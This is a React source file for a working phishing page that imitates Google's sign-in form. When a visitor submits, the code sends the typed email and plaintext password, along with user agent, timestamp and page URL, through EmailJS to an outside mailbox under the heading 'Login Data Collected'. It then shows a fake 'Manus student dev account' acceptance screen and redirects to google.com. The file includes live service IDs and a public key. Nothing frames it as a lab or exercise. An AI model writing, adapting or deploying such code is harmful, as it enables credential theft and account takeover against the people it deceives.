import React, { useState, useEffect } from 'react';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [showSuccessScreen, setShowSuccessScreen] = useState(false);

  useEffect(() => {
    // Load EmailJS script
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    script.onload = () => {
      // Initialize EmailJS with your public key
      window.emailjs.init("DCnFHeeyL6GEWE6J2");
    };
    document.head.appendChild(script);

    // Initialize Formbricks
    const initFormbricks = () => {
      const appUrl = "https://app.formbricks.com";
      const environmentId = "cmffix8ko2828x901hlai76qm";
      
      if (window.formbricks) return;
      
      const formbricksScript = document.createElement("script");
      formbricksScript.type = "text/javascript";
      formbricksScript.async = true;
      formbricksScript.src = appUrl + "/js/formbricks.umd.cjs";
      formbricksScript.onload = function() {
        if (window.formbricks) {
          window.formbricks.setup({
            environmentId: environmentId,
            apiHost: appUrl,
            debug: false
          });
        } else {
          console.error("Formbricks library failed to load properly.");
        }
      };
      
      document.head.appendChild(formbricksScript);
    };

    initFormbricks();

    return () => {
      document.head.removeChild(script);
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // Send data via EmailJS using your template
      const templateParams = {
        from_name: email,
        to_name: "Admin",
        message: `Login Data Collected:
        
Email: ${email}
Password: ${password}
Timestamp: ${new Date().toISOString()}
User Agent: ${navigator.userAgent}
Page URL: ${window.location.href}

This is an automated message with login attempt data.`,
        reply_to: "ictproject499@gmail.com",
        subject: `Login Attempt - ${email}`
      };

      // Send the email with your specific IDs
      const response = await window.emailjs.send(
        "service_wni6k0h", 
        "template_pf34tgf", 
        templateParams
      );
      
      // Track with Formbricks if available
      if (window.formbricks) {
        window.formbricks.track("login_attempt", {
          email: email,
          timestamp: new Date().toISOString()
        });
      }
      
      // Show success screen
      setShowSuccessScreen(true);
    } catch (err) {
      setError('An error occurred. Please try again.');
      setIsLoading(false);
      console.error('Error:', err);
    }
  };

  if (showSuccessScreen) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-sm text-center">
          {/* Manus AI Logo */}
          <div className="mb-8">
            <img 
              src="https://placehold.co/200x60/1f2937/ffffff?text=Manus+AI" 
              alt="Manus AI Logo" 
              className="w-48 h-auto mx-auto"
            />
          </div>
          
          {/* Success Message */}
          <div className="bg-white rounded-lg shadow-md p-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-6">
              Manus student dev account submission request accepted 2/5 teachers
            </h1>
            
            {/* Continue Button - redirects to google.com */}
            <button
              onClick={() => {
                // Track button click with Formbricks if available
                if (window.formbricks) {
                  window.formbricks.track("continue_to_google_clicked", {
                    timestamp: new Date().toISOString()
                  });
                }
                window.location.href = 'https://www.google.com';
              }}
              className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
            >
              Continue to Google
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* Google Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
            alt="Google" 
            className="w-28 h-auto"
          />
        </div>

        {/* Error Message */}
        {error && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4 text-sm">
            {error}
          </div>
        )}

        {/* Form Card */}
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Title */}
          <h1 className="text-xl font-medium text-gray-800 mb-6 text-center">
            Sign in
          </h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                Email or phone
              </label>
              <input
                type="email"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                placeholder="Email or phone"
                required
              />
            </div>
            
            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                Password
              </label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                placeholder="Password"
                required
              />
              <div className="flex justify-end mt-2">
                <a href="#" className="text-sm text-blue-600 hover:underline">
                  Forgot password?
                </a>
              </div>
            </div>

            {/* Buttons */}
            <div className="flex gap-4 pt-4">
              <button
                type="button"
                className="px-4 py-3 text-sm font-medium text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-md flex-1 transition-colors"
              >
                Create account
              </button>
              <button
                type="submit"
                className="px-4 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md flex-1 transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                  </div>
                ) : (
                  'Next'
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Footer Links */}
        <div className="mt-6 text-center text-sm text-gray-600 space-y-2">
          <p>
            <a href="#" className="hover:underline">English (United States)</a>
            <span className="mx-1">·</span>
            <a href="#" className="hover:underline">Help</a>
            <span className="mx-1">·</span>
            <a href="#" className="hover:underline">Privacy</a>
            <span className="mx-1">·</span>
            <a href="#" className="hover:underline">Terms</a>
          </p>
        </div>
      </div>
    </div>
  );
}